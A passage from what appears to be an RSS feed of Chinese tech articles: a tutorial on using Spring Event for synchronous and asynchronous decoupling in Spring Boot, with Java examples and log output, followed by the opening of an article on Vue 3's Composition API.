N个子业务。如果都放到一块儿去做，代码可能会很长，耦合度不断攀升，维护起来也麻烦，甚至头疼。还有一些业务场景不需要在一次请求中同步完成，比如邮件发送、短信发送等。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;MQ 确实可以解决这个问题，但 MQ 重啊，非必要不提升架构复杂度。针对这些问题，我们了解一下 Spring Event。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;基于 Spring Boot + MyBatis Plus + Vue &amp;amp; Element 实现的后台管理系统 + 用户小程序，支持 RBAC 动态权限、多租户、数据权限、工作流、三方登录、支付、短信、商城等功能。&lt;/p&gt;&lt;p&gt;项目地址：https://github.com/YunaiV/ruoyi-vue-pro&lt;/p&gt;&lt;/blockquote&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;Spring Event 同步使用&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Spring Event（&lt;code&gt;Application Event&lt;/code&gt;）其实就是一个观察者设计模式，一个 Bean 处理完成任务后希望通知其它 Bean 或者说一个 Bean 想观察监听另一个Bean 的行为。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Spring Event 用来解耦业务真的贼好用！&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;Demo 地址：https://gitee.com/csps/mingyue-springboot-learning&lt;/p&gt;&lt;/blockquote&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;1.自定义事件&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;定义事件，继承 &lt;code&gt;ApplicationEvent&lt;/code&gt; 的类成为一个事件类&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt; lombok.Data;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.ToString;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.context.ApplicationEvent;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;/**&lt;br/&gt; * &lt;span&gt;@author&lt;/span&gt; Strive&lt;br/&gt; * &lt;span&gt;@date&lt;/span&gt; 2022/4/22 18:00&lt;br/&gt; * &lt;span&gt;@description&lt;/span&gt;&lt;br/&gt; */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@Data&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@ToString&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;OrderProductEvent&lt;/span&gt; &lt;span&gt;extends&lt;/span&gt; &lt;span&gt;ApplicationEvent&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;/** 该类型事件携带的信息 */&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;private&lt;/span&gt; String orderId;&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;OrderProductEvent&lt;/span&gt;&lt;span&gt;(Object source, String orderId)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;super&lt;/span&gt;(source);&lt;br/&gt;    &lt;span&gt;this&lt;/span&gt;.orderId = orderId;&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;2.定义监听器&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;监听并处理事件，实现 &lt;code&gt;ApplicationListener&lt;/code&gt; 接口或者使用 &lt;code&gt;@EventListener&lt;/code&gt; 注解&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt; com.csp.mingyue.event.events.OrderProductEvent;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.SneakyThrows;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.extern.slf4j.Slf4j;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.context.ApplicationListener;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.stereotype.Component;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;/**&lt;br/&gt; * 实现 ApplicationListener 接口，并指定监听的事件类型&lt;br/&gt; *&lt;br/&gt; * &lt;span&gt;@author&lt;/span&gt; Strive&lt;br/&gt; * &lt;span&gt;@date&lt;/span&gt; 2022/4/24 09:09&lt;br/&gt; * &lt;span&gt;@description&lt;/span&gt;&lt;br/&gt; */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@Slf&lt;/span&gt;4j&lt;br/&gt;&lt;span&gt;@Component&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;OrderProductListener&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;ApplicationListener&lt;/span&gt;&amp;lt;&lt;span&gt;OrderProductEvent&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;/** 使用 onApplicationEvent 方法对消息进行接收处理 */&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;@SneakyThrows&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;onApplicationEvent&lt;/span&gt;&lt;span&gt;(OrderProductEvent event)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    String orderId = event.getOrderId();&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; start = System.currentTimeMillis();&lt;br/&gt;    Thread.sleep(&lt;span&gt;2000&lt;/span&gt;);&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; end = System.currentTimeMillis();&lt;br/&gt;    log.info(&lt;span&gt;&quot;{}：校验订单商品价格耗时：({})毫秒&quot;&lt;/span&gt;, orderId, (end - start));&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;3.定义发布者&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;发布事件，通过 &lt;code&gt;ApplicationEventPublisher&lt;/code&gt; 发布事件&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt; com.csp.mingyue.event.events.OrderProductEvent;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.RequiredArgsConstructor;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.extern.slf4j.Slf4j;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.context.ApplicationContext;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.stereotype.Service;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;/**&lt;br/&gt; * &lt;span&gt;@author&lt;/span&gt; Strive&lt;br/&gt; * &lt;span&gt;@date&lt;/span&gt; 2022/4/24 09:25&lt;br/&gt; * &lt;span&gt;@description&lt;/span&gt;&lt;br/&gt; */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@Slf&lt;/span&gt;4j&lt;br/&gt;&lt;span&gt;@Service&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@RequiredArgsConstructor&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;OrderService&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;/** 注入ApplicationContext用来发布事件 */&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; ApplicationContext applicationContext;&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;/**&lt;br/&gt;   * 下单&lt;br/&gt;   *&lt;br/&gt;   * &lt;span&gt;@param&lt;/span&gt; orderId 订单ID&lt;br/&gt;   */&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;buyOrder&lt;/span&gt;&lt;span&gt;(String orderId)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; start = System.currentTimeMillis();&lt;br/&gt;    &lt;span&gt;// 1.查询订单详情&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// 2.检验订单价格 （同步处理）&lt;/span&gt;&lt;br/&gt;    applicationContext.publishEvent(&lt;span&gt;new&lt;/span&gt; OrderProductEvent(&lt;span&gt;this&lt;/span&gt;, orderId));&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// 3.短信通知（异步处理）&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; end = System.currentTimeMillis();&lt;br/&gt;    log.info(&lt;span&gt;&quot;任务全部完成，总耗时：({})毫秒&quot;&lt;/span&gt;, end - start);&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;购买成功&quot;&lt;/span&gt;;&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.单测执行&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt; org.junit.jupiter.api.Test;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.beans.factory.annotation.Autowired;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.boot.test.context.SpringBootTest;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;/**&lt;br/&gt; * &lt;span&gt;@author&lt;/span&gt; Strive&lt;br/&gt; * &lt;span&gt;@date&lt;/span&gt; 2022/4/24 09:28&lt;br/&gt; * &lt;span&gt;@description&lt;/span&gt;&lt;br/&gt; */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@SpringBootTest&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;OrderServiceTest&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;  &lt;span&gt;@Autowired&lt;/span&gt; &lt;span&gt;private&lt;/span&gt; OrderService orderService;&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;@Test&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;buyOrderTest&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    orderService.buyOrder(&lt;span&gt;&quot;732171109&quot;&lt;/span&gt;);&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;执行结果如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;13&lt;/span&gt;:&lt;span&gt;17.535&lt;/span&gt;  INFO &lt;span&gt;44272&lt;/span&gt; --- [           main] c.c.m.e.listener.OrderProductListener    : &lt;span&gt;732171109&lt;/span&gt;：校验订单商品价格耗时：(&lt;span&gt;2008&lt;/span&gt;)毫秒&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;13&lt;/span&gt;:&lt;span&gt;17.536&lt;/span&gt;  INFO &lt;span&gt;44272&lt;/span&gt; --- [           main] c.c.mingyue.event.service.OrderService   : 任务全部完成，总耗时：(&lt;span&gt;2009&lt;/span&gt;)毫秒&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;基于微服务的思想，构建在 B2C 电商场景下的项目实战。核心技术栈，是 Spring Boot + Dubbo 。未来，会重构成 Spring Cloud Alibaba 。&lt;/p&gt;&lt;p&gt;项目地址：https://github.com/YunaiV/onemall&lt;/p&gt;&lt;/blockquote&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;Spring Event 异步使用&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有些业务场景不需要在一次请求中同步完成，比如邮件发送、短信发送等。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;1.自定义事件&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt; lombok.AllArgsConstructor;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.Data;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;/**&lt;br/&gt; * &lt;span&gt;@author&lt;/span&gt; Strive&lt;br/&gt; * &lt;span&gt;@date&lt;/span&gt; 2022/4/24 10:18&lt;br/&gt; * &lt;span&gt;@description&lt;/span&gt;&lt;br/&gt; */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@Data&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@AllArgsConstructor&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;MsgEvent&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;/** 该类型事件携带的信息 */&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;public&lt;/span&gt; String orderId;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;2.定义监听器&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;推荐使用 &lt;code&gt;@EventListener&lt;/code&gt; 注解&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt; com.csp.mingyue.event.events.MsgEvent;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.SneakyThrows;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; lombok.extern.slf4j.Slf4j;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.context.event.EventListener;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; org.springframework.stereotype.Component;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;/**&lt;br/&gt; * &lt;span&gt;@author&lt;/span&gt; Strive&lt;br/&gt; * &lt;span&gt;@date&lt;/span&gt; 2022/4/24 10:20&lt;br/&gt; * &lt;span&gt;@description&lt;/span&gt;&lt;br/&gt; */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@Slf&lt;/span&gt;4j&lt;br/&gt;&lt;span&gt;@Component&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;MsgListener&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;@SneakyThrows&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;@EventListener&lt;/span&gt;(MsgEvent&lt;span&gt;.&lt;span&gt;class&lt;/span&gt;)&lt;br/&gt;  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;sendMsg&lt;/span&gt;(&lt;span&gt;MsgEvent&lt;/span&gt; &lt;span&gt;event&lt;/span&gt;) &lt;/span&gt;{&lt;br/&gt;    String orderId = event.getOrderId();&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; start = System.currentTimeMillis();&lt;br/&gt;    log.info(&lt;span&gt;&quot;开发发送短信&quot;&lt;/span&gt;);&lt;br/&gt;    log.info(&lt;span&gt;&quot;开发发送邮件&quot;&lt;/span&gt;);&lt;br/&gt;    Thread.sleep(&lt;span&gt;4000&lt;/span&gt;);&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; end = System.currentTimeMillis();&lt;br/&gt;    log.info(&lt;span&gt;&quot;{}：发送短信、邮件耗时：({})毫秒&quot;&lt;/span&gt;, orderId, (end - start));&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;3.定义发布者&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;/**&lt;br/&gt;  * 下单&lt;br/&gt;  *&lt;br/&gt;  * &lt;span&gt;@param&lt;/span&gt; orderId 订单ID&lt;br/&gt;  */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;buyOrder&lt;/span&gt;&lt;span&gt;(String orderId)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; start = System.currentTimeMillis();&lt;br/&gt;    &lt;span&gt;// 1.查询订单详情&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// 2.检验订单价格 （同步处理）&lt;/span&gt;&lt;br/&gt;    applicationContext.publishEvent(&lt;span&gt;new&lt;/span&gt; OrderProductEvent(&lt;span&gt;this&lt;/span&gt;, orderId));&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// 3.短信通知（异步处理）&lt;/span&gt;&lt;br/&gt;    applicationContext.publishEvent(&lt;span&gt;new&lt;/span&gt; MsgEvent(orderId));&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; end = System.currentTimeMillis();&lt;br/&gt;    log.info(&lt;span&gt;&quot;任务全部完成，总耗时：({})毫秒&quot;&lt;/span&gt;, end - start);&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;购买成功&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.单测执行（同步）&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@Test&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;buyOrderTest&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    orderService.buyOrder(&lt;span&gt;&quot;732171109&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;执行结果如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;24&lt;/span&gt;:&lt;span&gt;13.905&lt;/span&gt;  INFO &lt;span&gt;54848&lt;/span&gt; --- [           main] c.c.m.e.listener.OrderProductListener    : &lt;span&gt;732171109&lt;/span&gt;：校验订单商品价格耗时：(&lt;span&gt;2004&lt;/span&gt;)毫秒&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;24&lt;/span&gt;:&lt;span&gt;13.906&lt;/span&gt;  INFO &lt;span&gt;54848&lt;/span&gt; --- [           main] c.c.mingyue.event.listener.MsgListener   : 开发发送短信&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;24&lt;/span&gt;:&lt;span&gt;13.907&lt;/span&gt;  INFO &lt;span&gt;54848&lt;/span&gt; --- [           main] c.c.mingyue.event.listener.MsgListener   : 开发发送邮件&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;24&lt;/span&gt;:&lt;span&gt;17.908&lt;/span&gt;  INFO &lt;span&gt;54848&lt;/span&gt; --- [           main] c.c.mingyue.event.listener.MsgListener   : &lt;span&gt;732171109&lt;/span&gt;：发送短信、邮件耗时：(&lt;span&gt;4002&lt;/span&gt;)毫秒&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;24&lt;/span&gt;:&lt;span&gt;17.908&lt;/span&gt;  INFO &lt;span&gt;54848&lt;/span&gt; --- [           main] c.c.mingyue.event.service.OrderService   : 任务全部完成，总耗时：(&lt;span&gt;6008&lt;/span&gt;)毫秒&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;5.开启异步&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;启动类增加 &lt;code&gt;@EnableAsync&lt;/code&gt; 注解&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@EnableAsync&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@SpringBootApplication&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;MingYueSpringbootEventApplication&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    SpringApplication.run(MingYueSpringbootEventApplication&lt;span&gt;.&lt;span&gt;class&lt;/span&gt;, &lt;span&gt;args&lt;/span&gt;)&lt;/span&gt;;&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;Listener&lt;/code&gt; 类需要开启异步的方法增加 &lt;code&gt;@Async&lt;/code&gt; 注解&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@Async&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@SneakyThrows&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@EventListener&lt;/span&gt;(MsgEvent&lt;span&gt;.&lt;span&gt;class&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;sendMsg&lt;/span&gt;(&lt;span&gt;MsgEvent&lt;/span&gt; &lt;span&gt;event&lt;/span&gt;) &lt;/span&gt;{&lt;br/&gt;    String orderId = event.getOrderId();&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; start = System.currentTimeMillis();&lt;br/&gt;    log.info(&lt;span&gt;&quot;开发发送短信&quot;&lt;/span&gt;);&lt;br/&gt;    log.info(&lt;span&gt;&quot;开发发送邮件&quot;&lt;/span&gt;);&lt;br/&gt;    Thread.sleep(&lt;span&gt;4000&lt;/span&gt;);&lt;br/&gt;    &lt;span&gt;long&lt;/span&gt; end = System.currentTimeMillis();&lt;br/&gt;    log.info(&lt;span&gt;&quot;{}：发送短信、邮件耗时：({})毫秒&quot;&lt;/span&gt;, orderId, (end - start));&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;6.单测执行（异步）&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;发送短信的线程显示 &lt;code&gt;task-1&lt;/code&gt;，主线程结束后（总耗时：(2017)毫秒）控制台停止打印了&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;30&lt;/span&gt;:&lt;span&gt;59.002&lt;/span&gt;  INFO &lt;span&gt;59448&lt;/span&gt; --- [           main] c.c.m.e.listener.OrderProductListener    : &lt;span&gt;732171109&lt;/span&gt;：校验订单商品价格耗时：(&lt;span&gt;2009&lt;/span&gt;)毫秒&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;30&lt;/span&gt;:&lt;span&gt;59.009&lt;/span&gt;  INFO &lt;span&gt;59448&lt;/span&gt; --- [           main] c.c.mingyue.event.service.OrderService   : 任务全部完成，总耗时：(&lt;span&gt;2017&lt;/span&gt;)毫秒&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;30&lt;/span&gt;:&lt;span&gt;59.028&lt;/span&gt;  INFO &lt;span&gt;59448&lt;/span&gt; --- [         task-&lt;span&gt;1&lt;/span&gt;] c.c.mingyue.event.listener.MsgListener   : 开发发送短信&lt;br/&gt;&lt;span&gt;2022&lt;/span&gt;-&lt;span&gt;04&lt;/span&gt;-&lt;span&gt;24&lt;/span&gt; &lt;span&gt;10&lt;/span&gt;:&lt;span&gt;30&lt;/span&gt;:&lt;span&gt;59.028&lt;/span&gt;  INFO &lt;span&gt;59448&lt;/span&gt; --- [         task-&lt;span&gt;1&lt;/span&gt;] c.c.mingyue.event.listener.MsgListener   : 开发发送邮件&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/section&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
+<guid>bcb7459f867c4c287a7cda3102a5da1c</guid>
+<title>围绕Vue 3 Composition API构建一个应用程序，包含一些最佳实践！</title>
+<link>https://toutiao.io/k/qqlzah4</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzIwNDMyMTg4Ng==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/wIDSOebZK4NvWoUN1gSpNiaxwF4VLvroSV4fibB1a5iaLEaR23sVIW9ickg4StvsXlxnPpslKAltA6mvJUhkT2PsaA/0?wx_fmt=png&quot; data-nickname=&quot;JavaScript 每日一练&quot; data-alias=&quot;&quot; data-signature=&quot;每天一道JavaScript 实战题，让大家平时多多积累实用的知识，提高开发效率，才有更多的时间摸鱼。&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;1. Vue 3和Composition API的状况&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Vue 3已经发布了一年，它的主要新功能是：Composition API。从2021年秋季开始，推荐新项目使用Vue 3的 &lt;code&gt;script setup &lt;/code&gt;语法，所以希望我们能看到越来越多的生产级应用程序建立在Vue 3上。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这篇文章旨在展示一些有趣的方法来利用Composition API，以及如何围绕它来构造一个应用程序。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;2. 可组合函数和代码重用&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;新的组合API释放了许多有趣的方法来重用跨组件的代码。复习一下：以前我们根据组件选项API分割组件逻辑：data、methods、created 等。&lt;/p&gt;&lt;pre 